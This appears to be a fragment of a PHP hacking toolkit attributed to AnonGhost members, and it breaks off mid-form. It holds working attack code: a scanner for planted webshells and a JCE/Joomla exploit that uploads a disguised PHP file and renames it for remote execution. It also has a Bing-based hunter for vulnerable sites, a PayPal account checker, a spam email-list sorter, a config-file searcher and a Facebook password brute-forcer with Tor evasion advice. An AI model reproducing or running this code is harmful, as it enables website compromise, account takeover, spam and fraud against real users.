<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Search Shells uploaded</span><br>
<img src="http://www11.0zz0.com/2014/08/22/21/592562836.png">
<p align="center"></p><br>
<form method="POST">
</form><center>
<form action="" method="post">
<input name="traget" type="text" size="100" value="http://www.site.com/"/><br>
<br><br>
<input name="scan" size="100" value="Start Scaning" type="submit">
</form><br>';

set_time_limit(0);

if (isset($_POST["scan"])) {  

$url = $_POST['traget'];

echo "<br /><span class='start'>Scanning ".$url."<br /><br /></span>";
echo "ReSulT:<br /><br />";

$shells = array("WSO.php","dz.php","cpanel.php","cpn.php","sql.php","mysql.php","madspot.php","cp.php","cpbt.php","sYm.php",
"x.php","r99.php","lol.php","jo.php","wp.php","whmcs.php","shellz.php","d0main.php","d0mains.php","users.php",
"Cgishell.pl","killer.php","changeall.php","2.php","Sh3ll.php","dz0.php","dam.php","user.php","dom.php","whmcs.php",
"vb.zip","r00t.php","c99.php","gaza.php","1.php","wp.zip"."wp-content/plugins/disqus-comment-system/disqus.php",
"d0mains.php","wp-content/plugins/akismet/akismet.php","madspotshell.php","Sym.php","c22.php","c100.php",
"wp-content/plugins/akismet/admin.php#","wp-content/plugins/google-sitemap-generator/sitemap-core.php#",
"wp-content/plugins/akismet/widget.php#","Cpanel.php","zone-h.php","tmp/user.php","tmp/Sym.php","cp.php",
"tmp/madspotshell.php","tmp/root.php","tmp/whmcs.php","tmp/index.php","tmp/2.php","tmp/dz.php","tmp/cpn.php",
"tmp/changeall.php","tmp/Cgishell.pl","tmp/sql.php","tmp/admin.php","cliente/downloads/h4xor.php",
"whmcs/downloads/dz.php","L3b.php","d.php","tmp/d.php","tmp/L3b.php","wp-content/plugins/akismet/admin.php",
"templates/rhuk_milkyway/index.php","templates/beez/index.php","admin1.php","upload.php","up.php","vb.zip","vb.rar",
"admin2.asp","uploads.php","sa.php","sysadmins/","admin1/","administration/Sym.php","images/Sym.php",
"/r57.php","/wp-content/plugins/disqus-comment-system/disqus.php","/shell.php","/sa.php","/admin.php",
"/sa2.php","/2.php","/gaza.php","/up.php","/upload.php","/uploads.php","/templates/beez/index.php","shell.php","/amad.php",
"/t00.php","/dz.php","/site.rar","/Black.php","/site.tar.gz","/home.zip","/home.rar","/home.tar","/home.tar.gz",
"/forum.zip","/forum.rar","/forum.tar","/forum.tar.gz","/test.txt","/ftp.txt","/user.txt","/site.txt","/error_log","/error",
"/cpanel","/awstats","/site.sql","/vb.sql","/forum.sql","/backup.sql","/back.sql","/data.sql","wp.rar/",
"wp-content/plugins/disqus-comment-system/disqus.php","asp.aspx","/templates/beez/index.php","tmp/vaga.php",
"tmp/killer.php","whmcs.php","tmp/killer.php","tmp/domaine.pl","tmp/domaine.php","useradmin/",
"tmp/d0maine.php","d0maine.php","tmp/sql.php","tmp/dz1.php","dz1.php","forum.zip","Symlink.php","Symlink.pl", 
"forum.rar","joomla.zip","joomla.rar","wp.php","buck.sql","sysadmin.php","images/c99.php", "xd.php", "c100.php",
"spy.aspx","xd.php","tmp/xd.php","sym/root/home/","billing/killer.php","tmp/upload.php","tmp/admin.php",
"Server.php","tmp/uploads.php","tmp/up.php","Server/","wp-admin/c99.php","tmp/priv8.php","priv8.php","cgi.pl/", 
"tmp/cgi.pl","downloads/dom.php","templates/ja-helio-farsi/index.php","webadmin.html","admins.php",
"/wp-content/plugins/count-per-day/js/yc/d00.php", "admins/","admins.asp","admins.php","wp.zip");

//Start Scan
foreach ($shells as $shell){
$headers = get_headers("$url$shell"); // 

if (eregi('200', $headers[0])) {
//Result
echo "<a href='$url$shell'>$url$shell</a> <span class='found'>Done :D</span><br /><br/><br/>"; // 
$dz = fopen('shells.txt', 'a+');
$suck = "$url$shell";
fwrite($dz, $suck."\n");
}
}
//Result In Text File (shells.txt)
echo "You Will Find Shell'z here [ <a href='./shells.txt' target='_blank'>shells.txt</a> ]</span>";
}
}
echo"</center>";
echo"</body>";
echo"</html>";

if(isset($_GET['action']) && $_GET['action'] == 'jcemultiscnner'){
echo '<center><b class="conte">
<a href="?action=shellfnderr">Shell Finder</a> -
<a href="?action=jcescnr">Jce Scanner</a> -
<a href="?action=jcemultiscnner">JCE Multi-Uploader</a> -
<a href="?action=portscnnre">Port Scanner</a> -
<a href="?action=admnpgfndr">Admin Page Finder</a> -
<a href="?action=srchffilsses">Search Files</a> </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">JCE Multi-Uploader</span><center><br>';
echo '<form method="post" action="" enctype="multipart/form-data">
<p align="center"> 
<img src="http://www9.0zz0.com/2014/08/22/21/459163695.png"></p>
<center><table>
<tr>
<td></td><td></td><td><font face="Tahoma" color="#007700" size="2pt">List Websites</font><br><textarea class="area" style="width:500px;height:150px;resize:none" name="siteler"></textarea><br><br></td>
</tr>
<tr>
<td></td><td>File :</td><td><input type="file" name="dosya" style="border: 1px solid #007700 ; border-radius: 4px; box-shadow: 0px 0px 4px #007700;"> <input type="submit" value="Attack Now" /></td>
</tr></table>
</form>
</center>';

set_time_limit(0);
ini_set("max_execution_time", 0);
ob_implicit_flush(1);
ini_set("default_socket_timeout", 1);
if ($_POST) {
$jce = new jce;
$siteler = $_POST['siteler'];
$siteler = explode("
", $siteler);
foreach ($siteler as $host) {
$host = trim($host);
$host = str_replace("http://", "", $host);
echo "=> Name Website: <strong>$host</strong><br />";
flush();
@ob_flush();
$curl = curl_init();
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_URL, "http://$host/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20");
curl_setopt($curl, CURLOPT_USERAGENT, "BOT/0.1 (BOT for JCE)");
curl_setopt($curl, CURLOPT_TIMEOUT, 13);
$exec = curl_exec($curl);
curl_close($curl);
$str = array('2.0.11</title', '2.0.12</title', '2.0.13</title', '2.0.14</title', '2.0.15</title', '1.5.7.10</title', '1.5.7.11</title', '1.5.7.12</title', '1.5.7.13</title', '1.5.7.14</title');
$count = 0;
foreach ($str as $value) {
$pos = strpos($exec, $value);
if ($pos === false) {
$count = $count++;
}
}
if ($count = 10) {
echo '=> <font color="red">Wait.....</font><br/>';
flush();
@ob_flush();
} else {
echo '=> Loading.....<br/>';
flush();
@ob_flush();
}
$filename = "ghost" . rand(1, 200) . ".gif";
$content = "GIF89a1
";
$content.= file_get_contents($_FILES['dosya']['tmp_name']);
$data = "-----------------------------41184676334
";
$data.= "Content-Disposition: form-data; name=\"upload-dir\"

";
$data.= "/
";
$data.= "-----------------------------41184676334
";
$data.= "Content-Disposition: form-data; name=\"Filedata\"; filename=\"\"
";
$data.= "Content-Type: application/octet-stream


";
$data.= "-----------------------------41184676334
";
$data.= "Content-Disposition: form-data; name=\"upload-overwrite\"

";
$data.= "0
";
$data.= "-----------------------------41184676334
";
$data.= "Content-Disposition: form-data; name=\"Filedata\"; filename=\"" . $filename . "\"
";
$data.= "Content-Type: image/gif

";
$data.= "$content
";
$data.= "-----------------------------41184676334
";
$data.= "xxxy
";
$data.= "-----------------------------41184676334
";
$data.= "Content-Disposition: form-data; name=\"action\"

";
$data.= "upload
";
$data.= "-----------------------------41184676334--



";
$packet = "POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=9d09f693c63c1988a9f8a564e0da7743 HTTP/1.1
";
$packet.= "Host: " . $host . "
";
$packet.= "User-Agent: BOT/0.1 (BOT for JCE)
";
$packet.= "Content-Type: multipart/form-data; boundary=---------------------------41184676334
";
$packet.= "Accept-Language: en-us,en;q=0.5
";
$packet.= "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
";
$packet.= "Cookie: 6bc427c8a7981f4fe1f5ac65c1246b5f=9d09f693c63c1988a9f8a564e0da7743; jce_imgmanager_dir=%2F; __utma=216871948.2116932307.1317632284.1317632284.1317632284.1; __utmb=216871948.1.10.1317632284; __utmc=216871948; __utmz=216871948.1317632284.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)
";
$packet.= "Connection: Close
";
$packet.= "Proxy-Connection: close
";
$packet.= "Content-Length: " . strlen($data) . "



";
$packet.= $data;
$jce->sendpacket($host, $packet, 0, 0);
$filephp = str_replace("gif", "php", $filename);
$packet = "POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20 HTTP/1.1
";
$packet.= "Host: " . $host . "
";
$packet.= "User-Agent: BOT/0.1 (BOT for JCE) 
";
$packet.= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
";
$packet.= "Accept-Language: en-US,en;q=0.8
";
$packet.= "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
";
$packet.= "Content-Type: application/x-www-form-urlencoded; charset=utf-8
";
$packet.= "Accept-Encoding: deflate
";
$packet.= "X-Request: JSON
";
$packet.= "Cookie: __utma=216871948.2116932307.1317632284.1317639575.1317734968.3; __utmz=216871948.1317632284.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmb=216871948.20.10.1317734968; __utmc=216871948; jce_imgmanager_dir=%2F; 6bc427c8a7981f4fe1f5ac65c1246b5f=7df6350d464a1bb4205f84603b9af182
";
$ren = "json={\"fn\":\"folderRename\",\"args\":[\"/" . $filename . "\",\"" . $filephp . "\"]}";
$packet.= "Content-Length: " . strlen($ren) . "

";
$packet.= $ren . "

";
$jce->sendpacket($host, $packet, 1, 0);
$kontrol = $jce->uploadkontrolZenci("http://" . $host . "/images/stories/" . $filephp);
if ($kontrol) {
    echo "=> File Uploaded Successfully -> <a href='http://$host/images/stories/$filephp'>http://$host/images/stories/$filephp</a><br />";
    $jce->logyollaZenci("http://" . $host . "/images/stories/" . $filephp);
} else {
    echo "=> Sorry failed to upload the file :(<br />";
}
    }
}
class jce {
    public function sendpacket($host, $packet, $response = 0, $output = 0) {
$ock = fsockopen($host, 80);
stream_set_timeout($ock, 1);
if (!$ock) {
    echo '=> jce sucks i know hhhhhh xD<br/>';
}
fputs($ock, $packet);
if ($response == 1) {
    $html = '';
    while (!feof($ock)) {
$html.= fgets($ock);
    }
} else $html = '';
fclose($ock);
if ($response == 1 && $output == 1) echo nl2br(htmlentities($html));
    }
    public function uploadkontrolZenci($site) {
$curl = curl_init();
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_URL, $site);
curl_setopt($curl, CURLOPT_USERAGENT, "BOT/0.1 (BOT for JCE)");
curl_setopt($curl, CURLOPT_TIMEOUT, 15);
$exec = curl_exec($curl);
curl_close($curl);
if (preg_match('/GIF89a1/si', $exec)) {
    return true;
} else {
    return false;
}
}
}
};

if(isset($_GET['action']) && $_GET['action'] == 'jcescnr'){
echo '<center><b class="conte">
<a href="?action=shellfnderr">Shell Finder</a> -
<a href="?action=jcescnr">Jce Scanner</a> -
<a href="?action=jcemultiscnner">JCE Multi-Uploader</a> -
<a href="?action=portscnnre">Port Scanner</a> -
<a href="?action=admnpgfndr">Admin Page Finder</a> -
<a href="?action=srchffilsses">Search Files</a> </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">JCE Server Scanner</span><center><br>';

function _curl($url,$ref){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($ch, CURLOPT_REFERER, $ref);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8');
$resultt=curl_exec($ch);
curl_close($ch);
return  $resultt;
}

echo'
<img src="http://3.bp.blogspot.com/--66MC_oL1Ys/UjvlCefXI-I/AAAAAAAAA4U/1bO6MClKKAg/s1600/jce-logo1.png"  width="200" height="150">
<form method="post" name="op" action ="">
<input type="text" size="50" name="ip" placeholder="Ip:" /><br><br>
<input name="sub" type="submit" value="&nbsp;&nbsp;Scan&nbsp;&nbsp;" />
</form>';

if(isset($_POST['sub'])){
$ip=$_POST['ip'];
$j=0;
$con2=0;
echo "<p>Ip :".$ip."</p>";
echo '<table align="center" border="1" width="50%" cellspacing="1" cellpadding="5">';
echo '<tr><td> <font color="white"> Web Site </td><td> <font color="white">Jce Rezult </font></td></tr>';

while ($j<50000000){
$url='http://www.bing.com/search?q=ip:'.$ip.'%20index.php?option%20&first='.$j;
$result = _curl($url,'http://www.bing.com/');
preg_match_all('(<div class="sb_tlst">.*<h3>.*<a href="(.*)".*>(.*)</a>.*</h3>.*</div>)siU', $result , $findlink);
$cont=count($findlink[1]);
for($i=0;$i<$cont;$i++){
$shit=explode ("/",$findlink[1][$i]);
if (preg_match("/\bindex.php\b/i", $findlink[1][$i])) {
preg_match_all('(http://(.*)index.php)siU',$findlink[1][$i],$shit);
$website="http://".$shit[1][0];
$dork="/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=9d09f693c63c1988a9f8a564e0da7743";
$result2=_curl($website.$dork,$website);
if(strpos($result2,'{"result":null,"error":"No function call specified!"}')) {
echo '<tr><td><font color="green" ><a href="'.$website.'">'.$website."</a></td>";
echo "<td> <font color='green' >Jce On </font></td></tr>";
}else{
echo '<tr><td><font color="red" ><a href="'.$website.'">'.$website."</a></td>" ;
echo "<td> <font color='red' >Error</font></td></tr>";
}
}
}

$j=$j+10;
$con2=$con2+$cont;
if($cont<10){break;}
if($cont==0){break;}
}
echo "</table>";
echo "<font color='green' > Web Site :".$con2;
}
}
echo"</body></html>";

if(isset($_GET['action']) && $_GET['action'] == 'payppallchker'){
echo '<center><b class="conte">
<a href="?action=maiilllerrr">Mailer</a> -
<a href="?action=Everythingdawg">Everything You Need</a> -
<a href="?action=payppallchker">Paypal Checker</a> -
<a href="?action=emailllextrctr">Email Extractor</a></center></b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">PayPal Valid Email 
Checker</span><center><br>';
@set_time_limit(0);

function curl($url='',$var='',$Follow=False){
global $set;
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_CONNECTTIMEOUT,20);
curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31');
curl_setopt($curl, CURLOPT_COOKIE,'PP1.txt');
curl_setopt($curl, CURLOPT_COOKIEFILE,'PP1.txt');
curl_setopt($curl, CURLOPT_COOKIEJAR,'PP1.txt');
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 3);
curl_setopt($curl, CURLOPT_HEADER, 0);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);
if ($Follow !== False) {
curl_setopt($curl,CURLOPT_FOLLOWLOCATION,true);
}
$result = curl_exec($curl);
curl_close($curl);
return $result;
}
echo "<head>
<style type=\"text/css\"><!--
body {

font-family: 'Open Sans', sans-serif; font-size:13px}
hr {border:inset 1px #E5E5E5}
#form-container 
{
border: solid 1px #007700;
border-radius:10px;
-moz-border-radius: 10px;
-webkit-border-radius: 10px;
box-shadow: 0px 0px 4px #009900;
-moz-box-shadow: 0px 0px 4px #009900;
-webkit-box-shadow: 0px 0px 4px #009900;
margin:30px auto;
padding:10px;
width:910px;
text-shadow: 1px 1px 4px rgba(0,0,0,0.3);
}

#form-container1 
{
border: solid 1px #007700;
border-radius:10px;
-moz-border-radius: 10px;
-webkit-border-radius: 10px;
box-shadow: 0px 0px 15px #007700;
-moz-box-shadow: 0px 0px 15px #007700;
-webkit-box-shadow: 0px 0px 15px #007700;
margin:30px auto;
padding:10px;
width:280px;
text-shadow: 1px 1px 4px rgba(0,0,0,0.3);
}

input[type=text], textarea
{
background:transparent;
border:solid 1px #007700; 
border-radius:5px;
-moz-border-radius: 5px; 
-webkit-border-radius: 5px;
}
textarea { width:100%;height:200px; resize:none }
input[type=text] { width:160px;text-align:center }
input[type=text]:focus, textarea:focus { background:transparent; border:solid 1px #007700; color:#007700;}
.submit-button 
{ 
background: #57A02C;
border:solid 1px #57A02C;
border-radius:5px;
-moz-border-radius: 5px; 
-webkit-border-radius: 5px;
-moz-box-shadow: 0 1px 3px rgba(0,0,0,0.6);
-webkit-box-shadow: 0 1px 3px rgba(0,0,0,0.6);
text-shadow: 0 -1px 1px rgba(0,0,0,0.25);
border-bottom: 1px solid rgba(0,0,0,0.25);
position: relative;
color:#333333;
display: inline-block; 
cursor:pointer;
font-size:13px;
padding:3px 8px;
}
.submit-button:hover { background:#82D051;border:solid 1px #86CC50; }
.table
{
border: solid 1px #007700;
border-radius:10px;
-moz-border-radius: 5px;
-webkit-border-radius: 5px;
padding-left:10px;
}

.unverified
{
color:#800000;
font-weight: bold;
}
.business{
color:yellow;
font-weight: bold;
}
.premier{
color:#00FF00;
font-weight: bold;
}
.verified{
color:#800080;
font-weight: bold;
}
.nolog{
font-size: 10px;
font: red;
}


--></style>
<title>Valid Email Checker</title>
</head><div align=\"center\"></center>";

$emails = $_POST['emails'];
print '<div id="form-container"> <form method="POST">

<p align="center"><font face="Times New Roman" size="6">PayPal Valid Email 
Checker<br></font></p>

<p><textarea rows="10" name="emails" cols="48">'.$emails.'</textarea></p><br>
<p><input class="submit-button" type="submit" value="Submit" name="B1"></p>
</form> </div>';
if (!empty($emails)) {
$emails = explode("\r\n", $emails);
$yes = 0;
$not = 0;
$inv = 0;
$count = 1;
print "<p align=\"center\"><b>Checking <font color=\"#ff8f00\"> ".count($emails)."</font> emails ....</b><br></p><p align=\"center\">";
foreach ( $emails as $email ) {
$email = trim($email);
print $count .".<b> Checking <font color=\"#ff8f00\">".$email."</font>  ..... </b>";
$count++;
if(filter_var($email, FILTER_VALIDATE_EMAIL)){
$_CheckAction = curl('https://www.paypal.com/cgi-bin/webscr?cmd=_send-money&myAllTextSubmitID=&cmd=_send-money&type=external&payment_source=p2p_mktgpage&payment_type=Gift&sender_email='.$email.'&email=gz%40s.com&currency=USD&amount=10&amount_ccode=USD&submit.x=Continue',CURLOPT_FAILONERROR,TRUE);
if(!strpos($_CheckAction, "region")) {
print "<b><font size=\"3\" color=\"#006600\">Yes</font></b> <br>";
$yes++;
$vaild_yes .=$email."\n";
}
else {
print "<b><font color=\"#FF0000\">NO</font></b><br>";
$not++;
$vaild_no .=$email."\n";
}
}
else {
print "<b><font color=\"#FF0000\">Invalid email</font></b><br><br>";
$inv++;
$invaild .=$email."\n";
}
}

print '<p><table border="0" width="100%">

<tr>
<td><p align="center"><font face="Times New Roman" size="4">PayPal emails</font> <b>(<font color="#006600"><b>'.$yes.'</b></font>)</b> </p></td>
<td><p align="center"><font face="Times New Roman" size="4">Not PayPal emails</font> <b>(<font color="#FF0000">'.$not.'</font>)</b> </p> </td>
<td><p align="center"><font face="Times New Roman" size="4">Invalid emails</font> <b>(<font color="#FF0000">'.$inv.'</font>)</b> </p> </td>
</tr>
<tr>
<td><div id="form-container1"><textarea rows="10" name="S1" cols="43">'.$vaild_yes.'</textarea></div></td>
<td><div id="form-container1"><textarea rows="10" name="S2" cols="43">'.$vaild_no.'</textarea></div></td>
<td><div id="form-container1"><textarea rows="10" name="S3" cols="43">'.$invaild.'</textarea></div></td>
</tr>
</table></p>';
}
}
if(isset($_GET['action']) && $_GET['action'] == 'emailllextrctr'){
echo '<center><b class="conte">
<a href="?action=maiilllerrr">Mailer</a> -
<a href="?action=Everythingdawg">Everything You Need</a> -
<a href="?action=payppallchker">Paypal Checker</a> -
<a href="?action=emailllextrctr">Email Extractor</a></center></b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Email Extractor</span><center><br>';
echo'<center><font face=Tahoma size=2 color=#007700 >Put Your Maillist In The Following TEXTAREA and Start</font></center>
<center>
<form method="post">
<textarea class="area" type="text" wrap="VIRTUAL" name="mails" style="background:transparent; margin: 2px; width:708px; height: 220px;"></textarea><br><br>
<center><strong><input type="submit" id="gobutton" name="Extazy007" value="&nbsp;&nbsp;Start&nbsp;&nbsp;"></strong></center></form>';

$types = array("gmail","hotmail","yahoo","aol","mail","rocketmail","orange","live","outlook","sfr","laposte","msn","skynet");
if($_POST["Extazy007"] && !empty($_POST["mails"])){
foreach(explode("\n", $_POST["mails"]) as $mail){
foreach($types as $type){
if(eregi("@".$type, $mail)){
$file = fopen($type.".txt", "a");
fwrite($file, $mail."\n");
}
}
}
echo '<font size="4">';
if(file_exists("hotmail.txt")){ rd("hotmail.txt"); echo '</br><a style="background:#efefef;" href="hotmail.txt">Hotmail</a> : '.count(file("hotmail.txt")).'</br>'; }
if(file_exists("gmail.txt")){ rd("gmail.txt"); echo '</br><a style="background:#efefef;" href="gmail.txt">Gmail</a> : '.count(file("gmail.txt")).'</br>'; }
if(file_exists("yahoo.txt")){ rd("yahoo.txt"); echo '</br><a style="background:#efefef;" href="yahoo.txt">Yahoo</a> : '.count(file("yahoo.txt")).'</br>'; }
if(file_exists("aol.txt")){ rd("aol.txt"); echo '</br><a style="background:#efefef;" href="aol.txt">Aol</a> : '.count(file("aol.txt")).'</br>'; }
if(file_exists("mail.txt")){ rd("mail.txt"); echo '</br><a style="background:#efefef;" href="mail.txt">Mail</a> : '.count(file("mail.txt")).'</br>'; }
if(file_exists("rocketmail.txt")){ rd("rocketmail.txt"); echo '</br><a style="background:#efefef;" href="rocketmail.txt">Rocketmail</a> : '.count(file("rocketmail.txt")).'</br>'; }
if(file_exists("orange.txt")){ rd("orange.txt"); echo '</br><a style="background:#efefef;" href="orange.txt">Orange</a> : '.count(file("orange.txt")).'</br>'; }
if(file_exists("live.txt")){ rd("live.txt"); echo '</br><a style="background:#efefef;" href="live.txt">Live</a> : '.count(file("live.txt")).'</br>'; }
if(file_exists("outlook.txt")){ rd("outlook.txt"); echo '</br><a style="background:#efefef;" href="outlook.txt">Outlook</a> : '.count(file("outlook.txt")).'</br>'; }
if(file_exists("sfr.txt")){ rd("sfr.txt"); echo '</br><a style="background:#efefef;" href="sfr.txt">Sfr</a> : '.count(file("sfr.txt")).'</br>'; }
if(file_exists("laposte.txt")){ rd("laposte.txt"); echo '</br><a style="background:#efefef;" href="laposte.txt">Laposte</a> : '.count(file("laposte.txt")).'</br>'; }
if(file_exists("msn.txt")){ rd("msn.txt"); echo '</br><a style="background:#efefef;" href="msn.txt">Msn</a> : '.count(file("msn.txt")).'</br>'; }
if(file_exists("skynet.txt")){ rd("skynet.txt"); echo '</br><a style="background:#efefef;" href="skynet.txt">Skynet</a> : '.count(file("skynet.txt")).'</br>'; }
echo '</font>';
echo '<br><font color="Green"><p>Done With Success ! </p></font><br>';
}
function rd($file)
{
$text = array_unique(file($file));
if($text)
$f = @fopen($file,'w');
if($f){
fputs($f, join('',$text));
}
}
echo'
<br>
<strong><font face="Tahoma" color="blue" size="4">
Mail-List</font><font size="4" face=Tahoma color=red> Filter</font><font size="3" face=Tahoma color=#666666> v1.5 </font>
</br><font face=Tahoma size=3 color=#009900>Developed By Extazy007</font></strong>
<br><br>
<font face=Tahoma size=2 color=#007700>Contact: www.facebook.com/AnonGhostOfficial2</font>
</center>

';
}
if(isset($_GET['action']) && $_GET['action'] == 'srchffilsses'){
echo '<center><b class="conte">
<a href="?action=shellfnderr">Shell Finder</a> -
<a href="?action=jcescnr">Jce Scanner</a> -
<a href="?action=jcemultiscnner">JCE Multi-Uploader</a> -
<a href="?action=portscnnre">Port Scanner</a> -
<a href="?action=admnpgfndr">Admin Page Finder</a> -
<a href="?action=srchffilsses">Search Files</a> </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Files Search Engine</span><center><br>';
echo'<body bgcolor="blue" text="white">
<p align="center"> 
<img border="0" src="http://www.scriptspot.com/files/u5502/rodar_scan.gif"></p>
</head>';

echo'<form action="" method="post"><center><br/>
<label for="dirdir">Directory</label><br/>
<input type="text" id="dirdir"  name="dirdir" value="/" /><br/><br/>
<label for="filezzz">Files</label><br/>
<textarea class="area" rows="4" cols="50" name="filezzz">
config
auth
db
root
master

</textarea><br/><br/>
<input type="submit" value="search now !" />
</form></center>';

set_time_limit(0);
error_reporting(0);

if(!empty($_POST['dirdir']) && !empty($_POST['filezzz'])){
$dirdir = $_POST['dirdir'];
$filezzz = $_POST['filezzz'];
echo("<center>FILES</center>");
$files = glob($dirdir.'/*.php', GLOB_BRACE);
foreach($files as $file) {
foreach(explode("\n", $filezzz) as $f) {
$s = file_get_contents($file);
$f = preg_replace('/\s+/', '', $f);
$lines   = file($file);
$line_number = false;
while (list($key, $line) = each($lines) and !$line_number) {
$line_number = (strpos($line, $f) !== FALSE) ? $key + 1 : $line_number;
}
if (strpos($s, $f) !== false) {
echo '<center>';
echo("<br/><b>File:</b> ".$file);
echo '<hr>';
echo("<br/><b>Line:</b> ".$line_number);
echo("<br/><b>Function:</b> ".$f);
echo '<hr>';
echo '</center>';
}
}
}
}
}

echo'</html>';


echo'</html>';
if(isset($_GET['action']) && $_GET['action'] == 'brutfbckk'){
echo '<center><b class="conte">
<a href="?action=respwdvic">Reset Facebook Password Victim</a> -
<a href="?action=brutfbckk">Facebook Multi-Account BruteForce</a> </b></center>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Facebook Multi-Account BruteForce</span><center><br>';

ob_start();
@set_time_limit(0);
#################################################
#---------------------------------------------- #
# Facebook Brute Force 2014                     #
#Coded by : Mauritania Attacker&Noname-Haxor	#
#Greetz : All AnonGhost Members                 #
#This Tool Is For Erasing Israel in Fb          #
# --------------------------------------------- #
#################################################

echo "<form method='POST'>
<center>Dont use this script without TOR BROWSER + TOR SWITCHER (set up the interval seconds from TOR SWITCHER TO 2 SECONDS)</center><br>
<p dir='ltr' align='center'>
<textarea cols='22' class='area'  rows='14' name='username'>Target Name</textarea> 
<textarea cols='22' class='area'  rows='14' name='password'>Password</textarea><br>
<br>
<input type='submit' name='scan' value='Start BruteForce'><br></p><br>";
if(isset($_POST['scan'])){
#function
function brute($user,$pass){
$ch = curl_init();      
curl_setopt($ch, CURLOPT_URL, "https://m.facebook.com/login.php?login_attempt=1");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
curl_setopt($ch, CURLOPT_POSTFIELDS, "email={$user}&pass={$pass}");
curl_setopt($ch, CURLOPT_USERAGENT, "Chrome/36.0.1985.125"); 
$login = curl_exec($ch);
//print_r($login);
$check = (eregi('class="s t i u"',$login)) ? true:false;
if($check == true){
echo "<p align='center' dir='ltr'><font face='Tahoma' size='2'>Not the right one :(  || Username : <font color='red'>$user</font>&nbsp;  Password : <font color='red'>$pass</font></font></p>";
}else{
echo "<p align='center' dir='ltr'><font face='Tahoma' size='2'>This Password Seems Working !Try It ^_^ || Username: <font color='green'>$user</font>&nbsp; Password : <font color='green'>$pass</font></font></p>";
}
}             



	
$username = explode("\n", $_POST['username']);
$password = explode("\n", $_POST['password']);
	
	
foreach($username as $users) {
$users = @trim($users);
foreach($password as $pass) {
$pass = @trim($pass);
echo brute($users,$pass);
}
}
}
echo"<br>
<br>
<br>
<br>
<center><p><b><font size='2' face='Trebuchet MS' color='#007700'>Coded by: Mauritania Attacker&Noname-Hax0r</font></b></p></center>";
}

if(isset($_GET['action']) && $_GET['action'] == 'scannner'){
?><?php
}
if(isset($_GET['action']) && $_GET['action'] == 'spammm'){
?><?php
}

if(isset($_GET['action']) && $_GET['action'] == 'fcbookk'){
?><?php
}
if(isset($_GET['action']) && $_GET['action'] == 'Everythingdawg'){
echo '<center><b class="conte">
<a href="?action=maiilllerrr">Mailer</a> -
<a href="?action=Everythingdawg">Everything You Need</a> -
<a href="?action=payppallchker">Paypal Checker</a> -
<a href="?action=emailllextrctr">Email Extractor</a></center></b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Everything You Need</span><center><br>';
echo'
<center><iframe src="http://ug4all.com/binchecker/" width="900" height="600">Welcome Ghost</iframe>
</center>';
}

if(isset($_GET['action']) && $_GET['action'] == 'respwdvic'){
echo '<center><b class="conte">
<a href="?action=respwdvic">Reset Facebook Password Victim</a> -
<a href="?action=brutfbckk">Facebook Multi-Account BruteForce</a>
</center></b>';

@set_time_limit(0); 
echo "<form method='POST'> 
<title>Facebook Code Security Cracker > By Mauritania Attacker</title> 
<p align='center'> 
<img border='0' src='http://onlinexploits.com/pirater-facebook-gratuitement/images/logo.png' ></p> 
<center><font color='#007700'> Use Tor Switcher and Choose Threads Ip ===> 3 seconds and Good Hack ^_^</center>
<style> 
/* Rounded Corners */ 
#ghost { 
border: 1px #765942; 
border-radius: 4px; 
height: 250px; 
width: 260px; 
color: #999999; font-size: 9pt; background-color:transparent; box-shadow: 0px 0px 4px #999999;    padding: 3px;   -webkit-border-radius: 4px;   -moz-border-radius: 4px;   border-radius: 4px;   -webkit-box-shadow: rgb(228, 228, 228) 0px 0px 4px;   -moz-box-shadow: rgb(228, 228, 228) 0px 0px 4px;
} 
input { 
/* INPUTS */ 
border: 1px solid #765942; 
border-radius: 4px; } 
</style> 
<center><span style='font-size:30px; font-family:Fredericka the Great; color:#009900'>Facebook 0day Exploit Reset Code Priv8</span></center><br>
<center><font color='#007700'>Coded  By Mauritania Attacker</center><br>
